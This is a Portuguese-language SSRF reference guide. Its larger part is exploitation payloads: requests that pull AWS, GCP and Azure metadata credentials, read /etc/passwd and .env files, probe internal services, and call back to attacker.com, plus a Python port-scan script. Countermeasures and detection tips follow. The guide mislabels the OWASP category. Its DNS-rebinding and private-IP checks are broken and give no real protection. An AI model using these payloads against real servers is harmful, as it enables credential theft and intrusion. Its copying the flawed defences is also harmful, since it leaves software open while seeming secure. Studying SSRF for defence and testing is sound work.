# SSRF (Server-Side Request Forgery)

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 8.6 (Alto) |
| **OWASP Top 10** | #10 - Broken Function Level Access Control |
| **CWE** | CWE-918 |
| **Status** | ⚠️ Ativo e crítico |
| **Impacto** | Acesso a serviços internos, RCE, Data Exfiltration |

---

## 🔍 O que é SSRF?

SSRF (Server-Side Request Forgery) permite que um atacante induza o servidor a fazer requisições HTTP para locais não intencionados. Diferente de CSRF (Client-Side), SSRF é executado **do lado do servidor**.

**Impactos:**
- Acesso a serviços internos não expostos
- Cloud metadata exploitation (AWS, GCP, Azure)
- Bypass de firewall e controls
- Port scanning interno
- RCE via protocolo Gopher, File, etc.

---

## 💥 Exemplos Práticos de Exploração

### 1. **SSRF contra Admin Local**

**Cenário:** Admin page (127.0.0.1:8080/admin) não acessível diretamente

```
# Request normal - Acesso negado
GET /admin HTTP/1.1
→ 403 Forbidden

# Via SSRF - Acesso como localhost
POST /api/fetch HTTP/1.1
url=http://127.0.0.1:8080/admin
→ 200 OK (conteúdo admin retornado)
```

**Variações de localhost:**
```
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin  (IPv6)
```

### 2. **SSRF contra Serviços Internos**

**Descobrir serviços internos:**
```
# Scan de portas comuns
http://192.168.1.1:22   (SSH)
http://192.168.1.1:3306 (MySQL)
http://192.168.1.1:6379 (Redis)
http://192.168.1.1:27017 (MongoDB)
http://192.168.1.1:9200 (Elasticsearch)
```

**Explorar serviço descoberto:**
```
# Acesso ao Redis
http://192.168.1.5:6379/
GET /api/fetch?url=http://192.168.1.5:6379
→ Retorna dados do Redis

# Acesso ao MySQL via HTTP
http://192.168.1.5:3306/
→ Banner do MySQL
```

### 3. **AWS Metadata Exploitation**

**Obter credenciais AWS:**
```
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1

Resposta:
iam/
ami-id
ami-launch-index
...

# Enumerar IAM role
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Resposta:
instance-profile-name

# Obter credenciais
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/instance-profile-name

Resposta:
{
  "Code" : "Success",
  "AccessKeyId" : "AKIA...",
  "SecretAccessKey" : "...",
  "Token" : "..."
}
```

### 4. **Google Cloud Metadata**

```
GET /api/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json

Headers necessários:
Metadata-Flavor: Google
```

### 5. **Azure Metadata Exploitation**

```
GET /api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F

Headers:
Metadata:true
```

### 6. **SSRF com Redirecionamento (Open Redirect)**

```
# Página que redireciona para admin
GET /api/fetch?url=http://example.com/redirect?to=http://admin.internal

# Servidor segue redirecionamento
→ Acessa http://admin.internal
```

### 7. **SSRF via Upload (Webhook Callback)**

```
POST /api/create-webhook HTTP/1.1

{
  "webhook_url": "http://127.0.0.1/admin"
}

# Servidor faz callback para o webhook
→ Acesso obtido a http://127.0.0.1/admin
```

### 8. **Protocolo Gopher (DEPRECATED - RCE)**

```
# Enviar comandos SMTP via Gopher
gopher://mail.internal:25/

POST /api/fetch?url=gopher://mail.internal:25/

# Injetar comandos no servidor SMTP
```

### 9. **Protocolo File (LFI)**

```
# Ler arquivo local
GET /api/fetch?url=file:///etc/passwd

Resposta:
root:x:0:0:...

# Acesso a .env
GET /api/fetch?url=file:///var/www/html/.env
```

### 10. **SSRF Blind - Time-based Detection**

```
# Não há resposta, mas servidor acessa URL
POST /api/send-email HTTP/1.1
email=admin@internal.local
callback=http://attacker.com/callback

# Verificar logs do server
→ Requisição foi feita a attacker.com
→ SSRF confirmado
```

---

## 🎯 Port Scanning Interno

**Automatizar descoberta de serviços:**
```python
import requests

ports = [22, 80, 443, 3306, 5432, 6379, 9200, 27017, 8080, 8888]
for port in ports:
    try:
        r = requests.get(
            'http://target.com/api/fetch',
            params={'url': f'http://127.0.0.1:{port}/'},
            timeout=2
        )
        if r.status_code == 200:
            print(f"[+] Port {port}: OPEN")
            print(r.text[:200])
    except:
        pass
```

---

## 🛡️ Contramedidas e Prevenção

### 1. **Validar e Whitelist URLs**

```python
# ❌ Vulnerável
def fetch_url(url):
    response = requests.get(url)
    return response.text

# ✅ Seguro
ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def fetch_url(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domínio não permitido")
    return requests.get(url).text
```

### 2. **Bloquear IPs Privados**

```python
import ipaddress

PRIVATE_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Loopback
    ipaddress.ip_network('10.0.0.0/8'),       # Private
    ipaddress.ip_network('172.16.0.0/12'),    # Private
    ipaddress.ip_network('192.168.0.0/16'),   # Private
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local
]

def is_private_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        return any(ip_obj in net for net in PRIVATE_RANGES)
    except:
        return False

def fetch_url(url):
    parsed = urllib.parse.urlparse(url)
    if is_private_ip(parsed.hostname):
        raise ValueError("Acesso a IP privado bloqueado")
    return requests.get(url).text
```

### 3. **Disable Redirects**

```python
# ❌ Vulnerável - Segue redirects
response = requests.get(url, allow_redirects=True)

# ✅ Seguro - Não segue redirects
response = requests.get(url, allow_redirects=False)
```

### 4. **Timeout Curto**

```python
# Evitar DoS via conexão lenta
response = requests.get(url, timeout=2)
```

### 5. **DNS Rebinding Protection**

```python
import socket

def safe_resolve(hostname):
    """Resolver apenas uma vez"""
    ip = socket.gethostbyname(hostname)
    
    # Re-resolve para verificar
    ip2 = socket.gethostbyname(hostname)
    
    if ip != ip2:  # DNS rebinding detectado
        raise ValueError("DNS rebinding detectado")
    
    return ip
```

### 6. **Usar Proxy com Validação**

```
# Forçar requisições via proxy com regras
- Bloquear IPs privados
- Bloquear metadata endpoints
- Whitelist de domínios
```

### 7. **Segmentação de Rede**

- Serviços internos em subnet separada
- Firewall rules entre zonas
- Zero-trust architecture

---

## 🔎 Detecção

### Padrões Suspeitos
- URLs para `127.0.0.1`, `localhost`, `169.254.169.254`
- Protocolos: `gopher://`, `file://`
- Redirecionamentos para IPs privados
- Timeouts longos ou comportamento anômalo

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/ssrf |
| OWASP SSRF | https://owasp.org/www-community/attacks/Server_Side_Request_Forgery |
| HackTricks SSRF | https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server-Side%20Request%20Forgery |
| CWE-918 | https://cwe.mitre.org/data/definitions/918.html |

---

**Última atualização:** Agosto 2026
